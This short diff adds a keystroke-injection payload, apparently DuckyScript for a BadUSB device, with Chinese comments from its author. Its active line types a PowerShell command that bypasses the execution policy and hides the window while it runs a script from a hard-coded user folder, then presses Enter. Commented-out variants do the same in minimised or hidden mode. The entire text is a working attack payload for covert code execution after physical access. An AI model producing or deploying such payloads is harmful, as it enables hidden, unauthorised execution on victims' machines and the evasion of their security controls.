@@ -1,0 +1,8 @@
+REM STRING start /min powershell -ExecutionPolicy ByPass -File c.ps1 & exit
+REM try use run in hidden. Above just open a shell in mini
+REM 根据文件位置（在这个代码里面是固定的）和用户名（需要提前了解） 
+REM STRING powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\halfa\c.ps1"
+STRING Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File 'C:\Users\halfa\c.ps1'" -WindowStyle Hidden
+DELAY 1000
+ENTER
+REM 这是之前的三个，都只有一行，很好理解
